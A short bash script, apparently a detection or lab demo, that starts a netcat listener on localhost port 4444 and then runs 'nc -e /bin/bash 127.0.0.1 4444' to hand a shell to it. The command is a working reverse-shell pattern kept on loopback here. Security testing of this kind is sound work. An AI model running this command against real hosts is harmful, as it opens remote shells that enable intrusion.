#!/usr/bin/env bash
set -euo pipefail

echo "[demo] simulating reverse shell to localhost:4444"
echo "[demo] starting listener in background (nc -l 4444)"
{ nc -l 4444 >/tmp/revshell-listener.log 2>&1 & echo $! > /tmp/revshell-listener.pid; }

sleep 1

# Synthetic reverse shell attempt (remains local)
echo "[demo] launching nc -e /bin/bash 127.0.0.1 4444"
nc -e /bin/bash 127.0.0.1 4444 || echo "nc not available or blocked; this is expected on some systems"

trap '[[ -f /tmp/revshell-listener.pid ]] && kill $(cat /tmp/revshell-listener.pid) 2>/dev/null || true' EXIT
